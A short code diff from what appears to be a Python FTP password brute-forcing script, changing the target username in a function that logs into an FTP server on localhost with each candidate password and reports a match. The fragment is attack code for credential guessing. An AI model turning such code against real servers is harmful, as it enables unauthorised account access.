@@ -16,7 +16,7 @@ def ftp_brute(p):
 	try:
 		print "[*] User : securityci ", " [*] Password : ", p
 		host = 'localhost'
-		user = "securityci"
+		user = "besim"
 		ftp = ftplib.FTP(host, timeout=0.08)
 		ftp.login(user, p)
 		print colored("[*] Password Found ! :) = > " + str(p), 'green')
